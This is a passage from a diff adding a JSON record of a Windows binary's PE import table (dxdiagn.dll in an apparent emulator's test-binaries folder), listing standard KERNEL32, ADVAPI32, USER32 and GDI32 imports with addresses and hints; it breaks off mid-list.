@@ -1,0 +1,1546 @@
+{
+  "at": "2026-10-22T14:10:22.480895+00:00",
+  "source": "c7fae5ac7ea9e29dfa3f83a7c2bd87d092e0b3b2",
+  "provider": {
+    "path": "/home/user/wine-assembly/test/binaries/candidates/pirates-2004/dx9/dxdiagn.dll",
+    "bytes": 1720320,
+    "sha256": "50e31067ca6872ae0b7b35a65bf2a9d07c1de539b2d603a9472a48f5375c8307",
+    "machine": "i386 PE32",
+    "securityDirectoryBytes": 0,
+    "imports": [
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x106c",
+        "iatVA": "0x40106c",
+        "name": "FindFirstFileA",
+        "hint": 208
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1070",
+        "iatVA": "0x401070",
+        "name": "CloseHandle",
+        "hint": 49
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1074",
+        "iatVA": "0x401074",
+        "name": "CreateFileA",
+        "hint": 79
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1078",
+        "iatVA": "0x401078",
+        "name": "GetFullPathNameA",
+        "hint": 353
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x107c",
+        "iatVA": "0x40107c",
+        "name": "ExpandEnvironmentStringsA",
+        "hint": 185
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1080",
+        "iatVA": "0x401080",
+        "name": "lstrcmpiA",
+        "hint": 938
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1084",
+        "iatVA": "0x401084",
+        "name": "HeapFree",
+        "hint": 520
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1088",
+        "iatVA": "0x401088",
+        "name": "HeapAlloc",
+        "hint": 514
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x108c",
+        "iatVA": "0x40108c",
+        "name": "GetProcessHeap",
+        "hint": 410
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1090",
+        "iatVA": "0x401090",
+        "name": "GetPrivateProfileStringA",
+        "hint": 403
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1094",
+        "iatVA": "0x401094",
+        "name": "CompareStringA",
+        "hint": 55
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1098",
+        "iatVA": "0x401098",
+        "name": "GetSystemInfo",
+        "hint": 440
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x109c",
+        "iatVA": "0x40109c",
+        "name": "Sleep",
+        "hint": 830
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10a0",
+        "iatVA": "0x4010a0",
+        "name": "SetPriorityClass",
+        "hint": 796
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10a4",
+        "iatVA": "0x4010a4",
+        "name": "GetPriorityClass",
+        "hint": 396
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10a8",
+        "iatVA": "0x4010a8",
+        "name": "GetCurrentProcess",
+        "hint": 315
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10ac",
+        "iatVA": "0x4010ac",
+        "name": "GetProfileIntA",
+        "hint": 419
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10b0",
+        "iatVA": "0x4010b0",
+        "name": "GlobalMemoryStatus",
+        "hint": 502
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10b4",
+        "iatVA": "0x4010b4",
+        "name": "GetSystemDefaultLCID",
+        "hint": 435
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10b8",
+        "iatVA": "0x4010b8",
+        "name": "GetLocalTime",
+        "hint": 362
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10bc",
+        "iatVA": "0x4010bc",
+        "name": "WriteFile",
+        "hint": 907
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10c0",
+        "iatVA": "0x4010c0",
+        "name": "LockResource",
+        "hint": 596
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10c4",
+        "iatVA": "0x4010c4",
+        "name": "LoadResource",
+        "hint": 582
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10c8",
+        "iatVA": "0x4010c8",
+        "name": "SizeofResource",
+        "hint": 829
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10cc",
+        "iatVA": "0x4010cc",
+        "name": "FindResourceA",
+        "hint": 223
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10d0",
+        "iatVA": "0x4010d0",
+        "name": "GetTempPathA",
+        "hint": 456
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10d4",
+        "iatVA": "0x4010d4",
+        "name": "DeleteFileA",
+        "hint": 129
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10d8",
+        "iatVA": "0x4010d8",
+        "name": "LeaveCriticalSection",
+        "hint": 576
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10dc",
+        "iatVA": "0x4010dc",
+        "name": "EnterCriticalSection",
+        "hint": 150
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10e0",
+        "iatVA": "0x4010e0",
+        "name": "SetEvent",
+        "hint": 769
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10e4",
+        "iatVA": "0x4010e4",
+        "name": "ResetEvent",
+        "hint": 700
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10e8",
+        "iatVA": "0x4010e8",
+        "name": "WaitForSingleObject",
+        "hint": 890
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10ec",
+        "iatVA": "0x4010ec",
+        "name": "DeleteCriticalSection",
+        "hint": 127
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10f0",
+        "iatVA": "0x4010f0",
+        "name": "CreateEventA",
+        "hint": 75
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10f4",
+        "iatVA": "0x4010f4",
+        "name": "InitializeCriticalSection",
+        "hint": 533
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10f8",
+        "iatVA": "0x4010f8",
+        "name": "QueryPerformanceCounter",
+        "hint": 657
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x10fc",
+        "iatVA": "0x4010fc",
+        "name": "GetTickCount",
+        "hint": 465
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1100",
+        "iatVA": "0x401100",
+        "name": "GetCurrentThreadId",
+        "hint": 318
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1104",
+        "iatVA": "0x401104",
+        "name": "GetCurrentProcessId",
+        "hint": 316
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1108",
+        "iatVA": "0x401108",
+        "name": "GetSystemTimeAsFileTime",
+        "hint": 445
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x110c",
+        "iatVA": "0x40110c",
+        "name": "TerminateProcess",
+        "hint": 838
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1110",
+        "iatVA": "0x401110",
+        "name": "FindClose",
+        "hint": 204
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1114",
+        "iatVA": "0x401114",
+        "name": "SetUnhandledExceptionFilter",
+        "hint": 818
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1118",
+        "iatVA": "0x401118",
+        "name": "FileTimeToLocalFileTime",
+        "hint": 194
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x111c",
+        "iatVA": "0x40111c",
+        "name": "FileTimeToSystemTime",
+        "hint": 195
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1120",
+        "iatVA": "0x401120",
+        "name": "GetDateFormatA",
+        "hint": 319
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1124",
+        "iatVA": "0x401124",
+        "name": "SystemTimeToFileTime",
+        "hint": 835
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1128",
+        "iatVA": "0x401128",
+        "name": "GetLocaleInfoA",
+        "hint": 363
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x112c",
+        "iatVA": "0x40112c",
+        "name": "GetCurrentDirectoryA",
+        "hint": 313
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1130",
+        "iatVA": "0x401130",
+        "name": "GetWindowsDirectoryA",
+        "hint": 485
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1134",
+        "iatVA": "0x401134",
+        "name": "OutputDebugStringA",
+        "hint": 635
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1138",
+        "iatVA": "0x401138",
+        "name": "GetModuleFileNameA",
+        "hint": 371
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x113c",
+        "iatVA": "0x40113c",
+        "name": "GetFileAttributesA",
+        "hint": 342
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1140",
+        "iatVA": "0x401140",
+        "name": "InterlockedIncrement",
+        "hint": 541
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1144",
+        "iatVA": "0x401144",
+        "name": "InterlockedDecrement",
+        "hint": 537
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1148",
+        "iatVA": "0x401148",
+        "name": "MultiByteToWideChar",
+        "hint": 612
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x114c",
+        "iatVA": "0x40114c",
+        "name": "WideCharToMultiByte",
+        "hint": 894
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1150",
+        "iatVA": "0x401150",
+        "name": "lstrlenW",
+        "hint": 948
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1154",
+        "iatVA": "0x401154",
+        "name": "FindResourceW",
+        "hint": 226
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1158",
+        "iatVA": "0x401158",
+        "name": "IsProcessorFeaturePresent",
+        "hint": 556
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x115c",
+        "iatVA": "0x40115c",
+        "name": "FlushFileBuffers",
+        "hint": 230
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1160",
+        "iatVA": "0x401160",
+        "name": "GetLocaleInfoW",
+        "hint": 364
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1164",
+        "iatVA": "0x401164",
+        "name": "ReadFile",
+        "hint": 675
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1168",
+        "iatVA": "0x401168",
+        "name": "SetStdHandle",
+        "hint": 801
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x116c",
+        "iatVA": "0x40116c",
+        "name": "RaiseException",
+        "hint": 662
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1170",
+        "iatVA": "0x401170",
+        "name": "SetFilePointer",
+        "hint": 774
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1174",
+        "iatVA": "0x401174",
+        "name": "IsBadCodePtr",
+        "hint": 545
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1178",
+        "iatVA": "0x401178",
+        "name": "IsBadReadPtr",
+        "hint": 548
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x117c",
+        "iatVA": "0x40117c",
+        "name": "IsValidCodePage",
+        "hint": 558
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1180",
+        "iatVA": "0x401180",
+        "name": "IsValidLocale",
+        "hint": 560
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1184",
+        "iatVA": "0x401184",
+        "name": "EnumSystemLocalesA",
+        "hint": 172
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1188",
+        "iatVA": "0x401188",
+        "name": "GetUserDefaultLCID",
+        "hint": 469
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x118c",
+        "iatVA": "0x40118c",
+        "name": "GetStringTypeW",
+        "hint": 434
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1190",
+        "iatVA": "0x401190",
+        "name": "GetStringTypeA",
+        "hint": 431
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1194",
+        "iatVA": "0x401194",
+        "name": "VirtualProtect",
+        "hint": 880
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1198",
+        "iatVA": "0x401198",
+        "name": "GetCPInfo",
+        "hint": 253
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x119c",
+        "iatVA": "0x40119c",
+        "name": "GetOEMCP",
+        "hint": 394
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11a0",
+        "iatVA": "0x4011a0",
+        "name": "SetEndOfFile",
+        "hint": 765
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11a4",
+        "iatVA": "0x4011a4",
+        "name": "GetACP",
+        "hint": 246
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11a8",
+        "iatVA": "0x4011a8",
+        "name": "VirtualQuery",
+        "hint": 882
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11ac",
+        "iatVA": "0x4011ac",
+        "name": "InterlockedExchange",
+        "hint": 538
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11b0",
+        "iatVA": "0x4011b0",
+        "name": "HeapSize",
+        "hint": 526
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11b4",
+        "iatVA": "0x4011b4",
+        "name": "IsBadWritePtr",
+        "hint": 551
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11b8",
+        "iatVA": "0x4011b8",
+        "name": "VirtualAlloc",
+        "hint": 874
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11bc",
+        "iatVA": "0x4011bc",
+        "name": "LCMapStringW",
+        "hint": 564
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11c0",
+        "iatVA": "0x4011c0",
+        "name": "LCMapStringA",
+        "hint": 563
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11c4",
+        "iatVA": "0x4011c4",
+        "name": "VirtualFree",
+        "hint": 877
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11c8",
+        "iatVA": "0x4011c8",
+        "name": "HeapCreate",
+        "hint": 516
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11cc",
+        "iatVA": "0x4011cc",
+        "name": "HeapDestroy",
+        "hint": 518
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11d0",
+        "iatVA": "0x4011d0",
+        "name": "GetEnvironmentStringsW",
+        "hint": 335
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11d4",
+        "iatVA": "0x4011d4",
+        "name": "FreeEnvironmentStringsW",
+        "hint": 239
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11d8",
+        "iatVA": "0x4011d8",
+        "name": "GetEnvironmentStrings",
+        "hint": 333
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11dc",
+        "iatVA": "0x4011dc",
+        "name": "FreeEnvironmentStringsA",
+        "hint": 238
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11e0",
+        "iatVA": "0x4011e0",
+        "name": "GetStartupInfoA",
+        "hint": 428
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11e4",
+        "iatVA": "0x4011e4",
+        "name": "GetFileType",
+        "hint": 350
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11e8",
+        "iatVA": "0x4011e8",
+        "name": "GetStdHandle",
+        "hint": 430
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11ec",
+        "iatVA": "0x4011ec",
+        "name": "SetHandleCount",
+        "hint": 783
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11f0",
+        "iatVA": "0x4011f0",
+        "name": "GetSystemDirectoryA",
+        "hint": 438
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11f4",
+        "iatVA": "0x4011f4",
+        "name": "lstrcpyA",
+        "hint": 941
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11f8",
+        "iatVA": "0x4011f8",
+        "name": "GetModuleHandleA",
+        "hint": 373
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x11fc",
+        "iatVA": "0x4011fc",
+        "name": "GetVersionExA",
+        "hint": 475
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1200",
+        "iatVA": "0x401200",
+        "name": "lstrcmpA",
+        "hint": 935
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1204",
+        "iatVA": "0x401204",
+        "name": "CompareStringW",
+        "hint": 56
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1208",
+        "iatVA": "0x401208",
+        "name": "GetLastError",
+        "hint": 360
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x120c",
+        "iatVA": "0x40120c",
+        "name": "lstrlenA",
+        "hint": 947
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1210",
+        "iatVA": "0x401210",
+        "name": "FreeLibrary",
+        "hint": 240
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1214",
+        "iatVA": "0x401214",
+        "name": "LoadLibraryA",
+        "hint": 577
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1218",
+        "iatVA": "0x401218",
+        "name": "UnhandledExceptionFilter",
+        "hint": 855
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x121c",
+        "iatVA": "0x40121c",
+        "name": "GetProcAddress",
+        "hint": 407
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1220",
+        "iatVA": "0x401220",
+        "name": "TlsAlloc",
+        "hint": 843
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1224",
+        "iatVA": "0x401224",
+        "name": "TlsGetValue",
+        "hint": 845
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1228",
+        "iatVA": "0x401228",
+        "name": "SetLastError",
+        "hint": 787
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x122c",
+        "iatVA": "0x40122c",
+        "name": "TlsFree",
+        "hint": 844
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1230",
+        "iatVA": "0x401230",
+        "name": "ExitProcess",
+        "hint": 182
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1234",
+        "iatVA": "0x401234",
+        "name": "RtlUnwind",
+        "hint": 708
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1238",
+        "iatVA": "0x401238",
+        "name": "HeapReAlloc",
+        "hint": 524
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x123c",
+        "iatVA": "0x40123c",
+        "name": "GetCommandLineA",
+        "hint": 265
+      },
+      {
+        "dll": "KERNEL32.dll",
+        "iatRVA": "0x1240",
+        "iatVA": "0x401240",
+        "name": "TlsSetValue",
+        "hint": 846
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1000",
+        "iatVA": "0x401000",
+        "name": "OpenSCManagerA",
+        "hint": 427
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1004",
+        "iatVA": "0x401004",
+        "name": "RegOpenKeyExA",
+        "hint": 483
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1008",
+        "iatVA": "0x401008",
+        "name": "RegQueryValueExA",
+        "hint": 493
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x100c",
+        "iatVA": "0x40100c",
+        "name": "RegSetValueExA",
+        "hint": 506
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1010",
+        "iatVA": "0x401010",
+        "name": "RegDeleteValueA",
+        "hint": 467
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1014",
+        "iatVA": "0x401014",
+        "name": "RegEnumKeyA",
+        "hint": 470
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1018",
+        "iatVA": "0x401018",
+        "name": "RegQueryValueExW",
+        "hint": 494
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x101c",
+        "iatVA": "0x40101c",
+        "name": "RegCreateKeyExA",
+        "hint": 462
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1020",
+        "iatVA": "0x401020",
+        "name": "RegDeleteKeyA",
+        "hint": 465
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1024",
+        "iatVA": "0x401024",
+        "name": "CloseServiceHandle",
+        "hint": 62
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1028",
+        "iatVA": "0x401028",
+        "name": "QueryServiceConfigA",
+        "hint": 444
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x102c",
+        "iatVA": "0x40102c",
+        "name": "RegOpenKeyA",
+        "hint": 482
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1030",
+        "iatVA": "0x401030",
+        "name": "RegCloseKey",
+        "hint": 458
+      },
+      {
+        "dll": "ADVAPI32.dll",
+        "iatRVA": "0x1034",
+        "iatVA": "0x401034",
+        "name": "OpenServiceA",
+        "hint": 429
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1268",
+        "iatVA": "0x401268",
+        "name": "SystemParametersInfoA",
+        "hint": 665
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x126c",
+        "iatVA": "0x40126c",
+        "name": "GetWindowRect",
+        "hint": 372
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1270",
+        "iatVA": "0x401270",
+        "name": "GetSystemMetrics",
+        "hint": 349
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1274",
+        "iatVA": "0x401274",
+        "name": "CharNextA",
+        "hint": 42
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1278",
+        "iatVA": "0x401278",
+        "name": "GetDlgItemTextA",
+        "hint": 275
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x127c",
+        "iatVA": "0x40127c",
+        "name": "IntersectRect",
+        "hint": 402
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1280",
+        "iatVA": "0x401280",
+        "name": "OffsetRect",
+        "hint": 498
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1284",
+        "iatVA": "0x401284",
+        "name": "EnumDisplaySettingsA",
+        "hint": 211
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1288",
+        "iatVA": "0x401288",
+        "name": "ReleaseDC",
+        "hint": 554
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x128c",
+        "iatVA": "0x40128c",
+        "name": "GetDC",
+        "hint": 268
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1290",
+        "iatVA": "0x401290",
+        "name": "CharLowerBuffA",
+        "hint": 39
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1294",
+        "iatVA": "0x401294",
+        "name": "LoadStringA",
+        "hint": 456
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1298",
+        "iatVA": "0x401298",
+        "name": "FindWindowA",
+        "hint": 227
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x129c",
+        "iatVA": "0x40129c",
+        "name": "GetKeyboardType",
+        "hint": 295
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12a0",
+        "iatVA": "0x4012a0",
+        "name": "LoadImageA",
+        "hint": 445
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12a4",
+        "iatVA": "0x4012a4",
+        "name": "ShowWindow",
+        "hint": 658
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12a8",
+        "iatVA": "0x4012a8",
+        "name": "DialogBoxParamA",
+        "hint": 158
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12ac",
+        "iatVA": "0x4012ac",
+        "name": "SetForegroundWindow",
+        "hint": 599
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12b0",
+        "iatVA": "0x4012b0",
+        "name": "PostMessageA",
+        "hint": 511
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12b4",
+        "iatVA": "0x4012b4",
+        "name": "KillTimer",
+        "hint": 434
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12b8",
+        "iatVA": "0x4012b8",
+        "name": "SetTimer",
+        "hint": 634
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12bc",
+        "iatVA": "0x4012bc",
+        "name": "EndDialog",
+        "hint": 198
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12c0",
+        "iatVA": "0x4012c0",
+        "name": "IsDlgButtonChecked",
+        "hint": 419
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12c4",
+        "iatVA": "0x4012c4",
+        "name": "GetWindowTextA",
+        "hint": 375
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12c8",
+        "iatVA": "0x4012c8",
+        "name": "MessageBoxA",
+        "hint": 476
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12cc",
+        "iatVA": "0x4012cc",
+        "name": "SetWindowTextA",
+        "hint": 646
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12d0",
+        "iatVA": "0x4012d0",
+        "name": "CheckRadioButton",
+        "hint": 59
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12d4",
+        "iatVA": "0x4012d4",
+        "name": "EnableWindow",
+        "hint": 196
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12d8",
+        "iatVA": "0x4012d8",
+        "name": "GetDlgItem",
+        "hint": 273
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12dc",
+        "iatVA": "0x4012dc",
+        "name": "InflateRect",
+        "hint": 394
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12e0",
+        "iatVA": "0x4012e0",
+        "name": "InvalidateRect",
+        "hint": 403
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12e4",
+        "iatVA": "0x4012e4",
+        "name": "SetWindowPos",
+        "hint": 643
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12e8",
+        "iatVA": "0x4012e8",
+        "name": "GetCursorPos",
+        "hint": 267
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12ec",
+        "iatVA": "0x4012ec",
+        "name": "SetCursorPos",
+        "hint": 591
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12f0",
+        "iatVA": "0x4012f0",
+        "name": "ShowCursor",
+        "hint": 654
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12f4",
+        "iatVA": "0x4012f4",
+        "name": "SendMessageA",
+        "hint": 571
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12f8",
+        "iatVA": "0x4012f8",
+        "name": "SetRect",
+        "hint": 620
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x12fc",
+        "iatVA": "0x4012fc",
+        "name": "PeekMessageA",
+        "hint": 509
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1300",
+        "iatVA": "0x401300",
+        "name": "GetWindowLongA",
+        "hint": 366
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1304",
+        "iatVA": "0x401304",
+        "name": "DefWindowProcA",
+        "hint": 142
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x1308",
+        "iatVA": "0x401308",
+        "name": "RegisterClassA",
+        "hint": 534
+      },
+      {
+        "dll": "USER32.dll",
+        "iatRVA": "0x130c",
+        "iatVA": "0x40130c",
+        "name": "CreateWindowExA",
+        "hint": 96
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x103c",
+        "iatVA": "0x40103c",
+        "name": "GetDCOrgEx",
+        "hint": 359
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1040",
+        "iatVA": "0x401040",
+        "name": "GetClipBox",
+        "hint": 352
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1044",
+        "iatVA": "0x401044",
+        "name": "DeleteDC",
+        "hint": 140
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x1048",
+        "iatVA": "0x401048",
+        "name": "CreateDCA",
+        "hint": 46
+      },
+      {
+        "dll": "GDI32.dll",
+        "iatRVA": "0x104c",
